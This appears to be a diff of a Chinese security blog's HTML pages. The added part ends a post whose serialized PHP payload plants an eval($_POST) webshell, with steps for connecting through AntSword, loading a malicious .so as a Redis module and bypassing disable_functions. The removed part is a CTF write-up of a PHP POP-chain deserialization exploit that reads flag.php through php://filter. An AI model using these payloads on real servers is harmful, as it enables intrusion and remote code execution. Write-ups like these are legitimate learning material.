+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:15:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用蚁剑连接即可，我在本地测试时，发现$_GET[1]的一句话木马用蚁剑连接可能连接不上，建议使用$_POST[1]的一句话，然后查看php版本中的disable_function，发现有许多的函数被禁用了，所以可以启动子程序，并在子程序中有被禁的函数，所以我们可以在子程序中执行被禁的函数，因此可以使用我上面写的恶意so文件劫持系统函数，从而绕过disbale_function</p>
+<p>我们只需将so文件上传到tmp目录中，然后用蚁剑的redis插件加载恶意模块rce<br>``<br>module load /tmp/exp.so</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后就拿到shell了，执行命令查看目录</span><br></pre></td></tr></table></figure>
+<p>system.exec ls</p>
+<p>```<br>但是我的蚁剑好像无法加redis插件，所以我们利用上面我写的php文件，来通过php函数来加载子进程，从而执行恶意代码，当然蚁剑中也有bypass disable_function模块，但是好像这里也用不了</p>
+<p>参考文章</p>
+<p>PHP代码执行中出现过滤限制的绕过执行方法：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
+<p>巧用LD_PRELOAD突破disable_functions ：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-php特性解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -963,118 +1114,6 @@ __destruct()--------------------在类的对象被销毁之前被调用
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-pop链构造1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/" class="article-date">
-  	<time datetime="2021-09-07T16:00:00.000Z" itemprop="datePublished">2021-09-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/08/pop%E9%93%BE%E6%9E%84%E9%80%A01/">
-        pop链构造1
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="pop链构造1"><a href="#pop链构造1" class="headerlink" title="pop链构造1"></a>pop链构造1</h1><p>打开页面后，发现源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其中有几个魔术方法，所以可能是pop链的构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用</span><br><span class="line">__toString()魔术方法：在类的对象被当作字符串操作的时候，自动被调用</span><br><span class="line">__wakeup()魔术方法，在类的对象反序列化的时候，自动被调用</span><br><span class="line">__construct()构造方法：在类的对象实例化之前，自动被调用</span><br><span class="line">__get()魔术方法：从不可访问的属性中读取数据会触发</span><br></pre></td></tr></table></figure>
-
-<p>从代码中，我们可以看见一个include()包含的函数，因此，我们需要想办法使用这个函数帮我们读取文件，而要使用include()函数，我们需要调用Modifier类中的append()方法，而要调用Modifier类中的append()方法，我们需要调用Modifier类中的__invoke()魔术方法，而要调用__invoke()魔术方法，要将类的对象被调用为函数，所以我们可以看见Test类中的__get()方法中的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$function=$this-&gt;p;</span><br><span class="line">return $function();</span><br></pre></td></tr></table></figure>
-<p>我们可以构造$this-&gt;p=new Modifier();来调用__invoke()方法，而这其中需要调用__get()方法，而调用__get()方法，需要从不可访问的属性中读取数据时会触发，所以我们可以想到Show类的__toString()方法，其中的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;str-&gt;source;</span><br></pre></td></tr></table></figure>
-<p>所以我们可以构造$this-&gt;str=new Test();来触发__get方法，而要触发__toString()方法，要在类的对象被当作字符串操作时，所以我们可以看到__wakeup()魔术方法中的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source))</span><br></pre></td></tr></table></figure>
-<p>所以我们可以构造$this-&gt;source=new Show();</p>
-<p>所以我们可以构造exp，但是我们要在Show类中让$this-&gt;source为Show类的话，我们最后还需要用到__contruct()魔术方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=new Show(&#x27;s&#x27;);  #就会触发__contruct()魔术方法，且将s作为__contruct()的参数</span><br><span class="line"></span><br><span class="line">因此，链条为</span><br></pre></td></tr></table></figure>
-<p>include()–&gt;append()–&gt;_invoke()–&gt;__get()–&gt;__toString()–&gt;__wakeup()–&gt;unserialize()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们构造exp</span><br></pre></td></tr></table></figure>
-<p>Welcome to index.php<br>&lt;?php<br>//flag is in flag.php</p>
-<p>class Modifier {<br>    protected  $var=”php://filter/read=convert.base64-encode/resource=flag.php”;</p>
-<p>}</p>
-<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file=’index.php’){<br>        $this-&gt;source = $file;<br>    }<br>    public function __toString(){<br>        $this-&gt;str=new Test();<br>    }</p>
-<pre><code>public function __wakeup()&#123;
-    $this-&gt;source=new Show();
-&#125;
-</code></pre>
-<p>}</p>
-<p>class Test{<br>    public $p;</p>
-<pre><code>public function __get($key)&#123;
-    $this-&gt;p=new Modifier();
-&#125;
-</code></pre>
-<p>}</p>
-<p>$a=new Show();<br>$b=new Show($a)<br>$a-&gt;str=new Test();<br>$a-&gt;str-&gt;p=new Modifier();</p>
-<p>echo urlencode(serialize($b));<br>?&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后对代码的详细解析</span><br></pre></td></tr></table></figure>
-<p>Welcome to index.php<br>&lt;?php<br>//flag is in flag.php                                    //提示：flag在flag.php文件内，猜测是当前网站根目录下的flag.php<br>//WTF IS THIS?<br>//Learn From <a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a><br>//And Crack It!</p>
-<p>class Modifier {                                        //类，Modifier<br>    protected  $var;                                    //保护属性，$var<br>    public function append($value){                        //自定义方法，append($value)<br>        include($value);                                //文件包含参数$value，猜测这里可以利用文件包含读取flag.php的内容<br>    }<br>    public function __invoke(){                            //__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用<br>        $this-&gt;append($this-&gt;var);                        //把保护属性$var传入自定义方法append($value)，执行一次<br>    }<br>}<br>//很明显：<br>//这里我们要想执行文件包含flag.php，那么就要调用append($value)方法<br>//这里我们要想调用append($value)方法，那么就需要调用__invoke()魔术方法<br>//这里我们要想调用__invoke()，那么就需要将Modifier类的对象调用为函数<br>//这里，我们会发现$var属性的值传给了$value参数，所以要想包含flag.php的源码，就需要给$var传入php://filter………………..[省略]</p>
-<p>class Show{                                                //类，Show<br>    public $source;                                     //公有属性，$source<br>    public $str;                                        //公有属性，$str<br>    public function __construct($file=’index.php’){        //公有构造方法，在类的对象实例化之前，自动被调用<br>        $this-&gt;source = $file;                            //给$this-&gt;source属性赋值$file<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;        //打印字符串<br>    }<br>    public function __toString(){                        //__toString()魔术方法，在类的对象被当作字符串操作的时候，自动被调用<br>        return $this-&gt;str-&gt;source;                        //返回，str属性值的source属性<br>    }</p>
-<pre><code>public function __wakeup()&#123;                            //__wakeup()魔术方法，在类的对象反序列化的时候，自动被调用
-    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;    //正则匹配source属性的值
-        echo &quot;hacker&quot;;
-        $this-&gt;source = &quot;index.php&quot;;                //source属性赋值为index.php
-    &#125;
-&#125;
-</code></pre>
-<p>}<br>//很明显：<br>//__toString()魔术方法，有以下特征“$this-&gt;str-&gt;source”<br>//所以说，我们可以给str属性赋值为Test类的对象，那么由于该对象没有source属性，那么就会调用Test类的__get()魔术方法<br>//那么想要调用__toString魔术方法，就需要Show类的对象被当作字符串操作<br>//很明显，我们的__wakeup()魔术方法，里面有source属性被当作字符串去比较，所以我们可以给source属性赋值为Show属性的对象<br>//所以只要，我们可以利用反序列化，调用__wake()魔术方法，且source赋值为该类的对象，str属性赋值为Test类的对象即可</p>
-<p>class Test{                                                //类，Test<br>    public $p;                                            //公有属性，$p<br>    public function __construct(){                        //公有构造方法，在类的对象实例化之前，自动被调用<br>        $this-&gt;p = array();                                //属性$p初始化为数组<br>    }</p>
-<pre><code>public function __get($key)&#123;                        //__get()魔术方法，访问该类中不可访问的属性，自动被调用
-    $function = $this-&gt;p;                            //属性$this-&gt;p赋值给$function
-    return $function();                                //把$function调用为$function()函数
-&#125;
-</code></pre>
-<p>}<br>//很明显：<br>//这里的属性$p可以触发，__invoke()魔术方法，所以只要给$p赋值为Modifier类的对象即可</p>
-<p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a=new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}</p>
-<p>```<br>最后会回显base64码</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
